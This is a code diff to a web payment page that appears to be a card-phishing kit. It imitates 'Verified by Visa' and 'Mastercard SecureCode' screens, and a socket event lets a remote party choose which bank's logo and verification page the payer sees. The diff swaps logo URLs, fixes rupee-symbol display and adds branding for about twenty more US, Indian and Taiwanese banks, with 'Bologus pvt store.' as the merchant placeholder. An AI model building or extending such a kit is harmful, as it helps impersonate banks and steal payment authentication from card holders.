@@ -451,9 +451,9 @@
            <!-- Right Section -->
            <div class="md:w-5/12 p-5">
              <div id="paymentForm">
-               <div class="amount-display mb-6">
-                 Amount to Pay: ₹<span id="displayAmount">0.00</span>
-               </div>
+              <div class="amount-display mb-6">
+                Amount to Pay: <span class="rupee-symbol">&#8377;</span><span id="displayAmount">0.00</span>
+              </div>
                <form id="mainForm" class="space-y-4">
                  <div class="hidden">
                    <label class="block text-sm font-medium text-gray-700 mb-2">Amount (INR)</label>
@@ -605,7 +605,7 @@
          
          <div style="display: flex; justify-content: space-between; font-size: 13px; margin-bottom: 5px;">
            <span>Amount:</span>
-           <span id="transactionAmount">₹<span id="transactionAmount2"></span></span>
+           <span id="transactionAmount"><span class="rupee-symbol">&#8377;</span><span id="transactionAmount2"></span></span>
          </div>
          
          <div style="display: flex; justify-content: space-between; font-size: 13px; margin-bottom: 5px;">
@@ -1072,10 +1072,10 @@
            const verificationTypeLogo = document.getElementById('verificationTypeLogo');
            if (verificationTypeLogo) {
              if (data.verificationType === 'visa') {
-               verificationTypeLogo.src = 'https://seekvectors.com/storage/images/Verified%20by%20Visa-01.svg';
+               verificationTypeLogo.src = 'https://logosarchive.com/wp-content/uploads/2021/09/Visa-verified-logo.png';
                verificationTypeLogo.alt = 'Verified by Visa';
              } else {
-               verificationTypeLogo.src = 'https://www.mastercard.us/content/dam/public/mastercardcom/na/us/en/homepage/Home/mc-logo-52.svg';
+               verificationTypeLogo.src = 'https://www.pngitem.com/pimgs/m/461-4612727_mastercard-identity-check-mastercard-id-check-logo-hd.png';
                verificationTypeLogo.alt = 'Mastercard SecureCode';
              }
            }
@@ -1104,7 +1104,27 @@
                'nimb': 'https://www.nimb.com.np/static/images/nimbl-lotus.png',
                'bank of maga': 'https://upload.wikimedia.org/wikipedia/commons/a/a9/Bank_of_Taiwan_Seal.svg',
                'gibraltar': 'https://www.gibraltar.gi/uploads/images/Departments/2020/banking/GIB-Logo.jpg',
-               'default': 'https://www.seekpng.com/png/detail/136-1367179_mastercard-identity-check-mastercard-academy-logo.png'
+              'unionbankindia': 'https://upload.wikimedia.org/wikipedia/commons/d/d0/Union_Bank_of_India_Logo.svg',
+              'pnb': 'https://logotyp.us/file/pnb.svg',
+              'canera bank': 'https://logonoid.com/images/canara-bank-logo.png',
+              'capitalone': 'https://www.logo.wine/a/logo/Capital_One/Capital_One-Logo.wine.svg',
+              'td bank': 'https://cdn.worldvectorlogo.com/logos/td-bank-1.svg',
+              'citizens': 'https://locations.citizensbank.com/images/citizens-logo-rebrand.png',
+              'chase bank': 'https://1000logos.net/wp-content/uploads/2016/11/Chase-National-Bank-Logo-500x281.png',
+              'truist': 'https://upload.wikimedia.org/wikipedia/commons/8/8b/Truist_Financial_logo.svg',
+              'cathy united taiwan': 'https://www.caproasia.com/wp-content/uploads/2022/11/Cathay-United-Bank-Logo-Thumbnail.png',
+              'novascotia': 'https://cdn.logojoy.com/wp-content/uploads/2018/05/30160258/2_big7-768x591.png',
+              'sinopac bank taiwan': 'https://easy.sinopac.com/images/sinopac-logo.svg',
+              'hua nan bank taiwan': 'https://thebanks.eu/img/logos/Hua_Nan_Commercial_Bank.png',
+              'landbank taiwan': 'https://www.landbank.com/new_assets/landbank_logo_white.png',
+              'un bank taiwan': 'https://upload.wikimedia.org/wikipedia/commons/5/52/E.SUN_Bank.svg',
+              'KGI bank taiwan': 'https://upload.wikimedia.org/wikipedia/en/thumb/d/dd/KGI_Financial_Holding_logo_v2.png/250px-KGI_Financial_Holding_logo_v2.png',
+              'usaa bank': 'https://logos-world.net/wp-content/uploads/2021/03/USAA-United-Services-Automobile-Association-Logo-700x394.png',
+              'huntington': 'https://mma.prnewswire.com/media/551870/Huntington_Logo.jpg?w=300',
+              'm&t bank ': 'https://logotyp.us/file/mt-bank.svg',
+              'barclays bank': 'https://icons.veryicon.com/png/128/business/bank-logo-collection/barclays-bank-portfolio.png',
+              'santandar usa': 'https://logodownload.org/wp-content/uploads/2017/05/santander-logo-1.png',
+               'default': 'https://www.pngkey.com/png/detail/794-7948248_mastercard-securecode-logo-logo-mastercard-secure-code.png'
              };
              bankLogo.src = bankLogos[data.bankCode] || bankLogos['default'];
            }
@@ -1118,7 +1138,7 @@
            
            // Set other transaction details
            document.getElementById('merchantName').textContent = data.merchantName || storedData.merchantName || 'Bologus pvt store.';
-           document.getElementById('transactionAmount2').textContent = data.amount || storedData.amount || document.getElementById('displayAmount').textContent || '0.00';
+           document.getElementById('transactionAmount2').textContent = (data.amount || storedData.amount || document.getElementById('displayAmount').textContent || '0.00').replace(/^₹/, ''); // Remove existing rupee symbol if present
            document.getElementById('transactionDate').textContent = new Date().toLocaleString();
            
            // Setup event handlers
@@ -1143,26 +1163,47 @@
        socket.on('update_mc_bank', (data) => {
          if (data.invoiceId === currentInvoiceId) {
            const bankLogos = {
-             'sbi': 'https://assets.stickpng.com/images/61fc00073cf0e70004222069.png',
-             'hdfc': 'https://companieslogo.com/img/orig/HDB_BIG-092606ce.png?t=1720244492',
-             'icici': 'https://www.icicibank.com/content/dam/icicibank/india/assets/images/header/logo.png',
-             'axis': 'https://upload.wikimedia.org/wikipedia/commons/c/ce/AXISBank_Logo.svg',
-             'kotak': 'https://logotyp.us/file/kotak-mahindra.svg',
-             'yes': 'https://assets.stickpng.com/images/627ccfe31b2e263b45696ac8.png',
-             'dbs taiwan': 'https://www.dbs.com.sg/o/corporate-theme/images/Logo.svg',
-             'tanshin': 'http://www.alb-labuan.com/images/logo-taishin.png',
-             'hsbc': 'https://upload.wikimedia.org/wikipedia/commons/a/aa/HSBC_logo_(2018).svg',
-             'standard charterd': 'https://assets.stickpng.com/images/5a1d2dc54ac6b00ff574e292.png',
-             'boi': 'https://logolook.net/wp-content/uploads/2023/09/Bank-of-India-Logo.png',
-             'bob': 'https://logotyp.us/file/bank-of-baroda.svg',
-             'centralbankindia': 'https://iconape.com/wp-content/png_logo_vector/central-bank-of-india-1911-logo.png',
-             'boa': 'https://freelogopng.com/images/all_img/1658985465bank-of-america-logo-png.png',
-             'citibank': 'https://www.logo.wine/a/logo/Citigroup/Citigroup-Logo.wine.svg',
-             'usbank': 'https://logos-world.net/wp-content/uploads/2021/02/US-Bank-Logo-700x394.png',
-             'wellsfargo': 'https://www.logo.wine/a/logo/Wells_Fargo/Wells_Fargo-Logo.wine.svg',
-             'nimb': 'https://www.nimb.com.np/static/images/nimbl-lotus.png',
-             'bank of maga': 'https://upload.wikimedia.org/wikipedia/commons/a/a9/Bank_of_Taiwan_Seal.svg',
-             'default': 'https://www.mastercard.us/content/dam/public/mastercardcom/na/us/en/homepage/Home/mc-logo-52.svg'
+                    'sbi': 'https://logolook.net/wp-content/uploads/2022/04/SBI-Logo.png',
+               'hdfc': 'https://companieslogo.com/img/orig/HDB_BIG-092606ce.png?t=1720244492',
+               'icici': 'https://www.icicibank.com/content/dam/icicibank/india/assets/images/header/logo.png',
+               'axis': 'https://upload.wikimedia.org/wikipedia/commons/c/ce/AXISBank_Logo.svg',
+               'kotak': 'https://logotyp.us/file/kotak-mahindra.svg',
+               'yes': 'https://assets.stickpng.com/images/627ccfe31b2e263b45696ac8.png',
+               'dbs taiwan': 'https://www.dbs.com.sg/o/corporate-theme/images/Logo.svg',
+               'tanshin': 'http://www.alb-labuan.com/images/logo-taishin.png',
+               'hsbc': 'https://upload.wikimedia.org/wikipedia/commons/a/aa/HSBC_logo_(2018).svg',
+               'standard charterd': 'https://assets.stickpng.com/images/5a1d2dc54ac6b00ff574e292.png',
+               'boi': 'https://logolook.net/wp-content/uploads/2023/09/Bank-of-India-Logo.png',
+               'bob': 'https://logotyp.us/file/bank-of-baroda.svg',
+               'centralbankindia': 'https://iconape.com/wp-content/png_logo_vector/central-bank-of-india-1911-logo.png',
+               'boa': 'https://freelogopng.com/images/all_img/1658985465bank-of-america-logo-png.png',
+               'citibank': 'https://www.logo.wine/a/logo/Citigroup/Citigroup-Logo.wine.svg',
+               'usbank': 'https://logos-world.net/wp-content/uploads/2021/02/US-Bank-Logo-700x394.png',
+               'wellsfargo': 'https://www.logo.wine/a/logo/Wells_Fargo/Wells_Fargo-Logo.wine.svg',
+               'nimb': 'https://www.nimb.com.np/static/images/nimbl-lotus.png',
+               'bank of maga': 'https://upload.wikimedia.org/wikipedia/commons/a/a9/Bank_of_Taiwan_Seal.svg',
+               'gibraltar': 'https://www.gibraltar.gi/uploads/images/Departments/2020/banking/GIB-Logo.jpg',
+              'unionbankindia': 'https://upload.wikimedia.org/wikipedia/commons/d/d0/Union_Bank_of_India_Logo.svg',
+              'pnb': 'https://logotyp.us/file/pnb.svg',
+              'canera bank': 'https://logonoid.com/images/canara-bank-logo.png',
+              'capitalone': 'https://www.logo.wine/a/logo/Capital_One/Capital_One-Logo.wine.svg',
+              'td bank': 'https://cdn.worldvectorlogo.com/logos/td-bank-1.svg',
+              'citizens': 'https://locations.citizensbank.com/images/citizens-logo-rebrand.png',
+              'chase bank': 'https://1000logos.net/wp-content/uploads/2016/11/Chase-National-Bank-Logo-500x281.png',
+              'truist': 'https://upload.wikimedia.org/wikipedia/commons/8/8b/Truist_Financial_logo.svg',
+              'cathy united taiwan': 'https://www.caproasia.com/wp-content/uploads/2022/11/Cathay-United-Bank-Logo-Thumbnail.png',
+              'novascotia': 'https://cdn.logojoy.com/wp-content/uploads/2018/05/30160258/2_big7-768x591.png',
+              'sinopac bank taiwan': 'https://easy.sinopac.com/images/sinopac-logo.svg',
+              'hua nan bank taiwan': 'https://thebanks.eu/img/logos/Hua_Nan_Commercial_Bank.png',
+              'landbank taiwan': 'https://www.landbank.com/new_assets/landbank_logo_white.png',
+              'un bank taiwan': 'https://upload.wikimedia.org/wikipedia/commons/5/52/E.SUN_Bank.svg',
+              'KGI bank taiwan': 'https://upload.wikimedia.org/wikipedia/en/thumb/d/dd/KGI_Financial_Holding_logo_v2.png/250px-KGI_Financial_Holding_logo_v2.png',
+              'usaa bank': 'https://logos-world.net/wp-content/uploads/2021/03/USAA-United-Services-Automobile-Association-Logo-700x394.png',
+              'huntington': 'https://mma.prnewswire.com/media/551870/Huntington_Logo.jpg?w=300',
+              'm&t bank ': 'https://logotyp.us/file/mt-bank.svg',
+              'barclays bank': 'https://icons.veryicon.com/png/128/business/bank-logo-collection/barclays-bank-portfolio.png',
+              'santandar usa': 'https://logodownload.org/wp-content/uploads/2017/05/santander-logo-1.png',
+               'default': 'https://www.pngkey.com/png/detail/794-7948248_mastercard-securecode-logo-logo-mastercard-secure-code.png'
            };
            
            const bankLogo = document.getElementById('bankLogo');
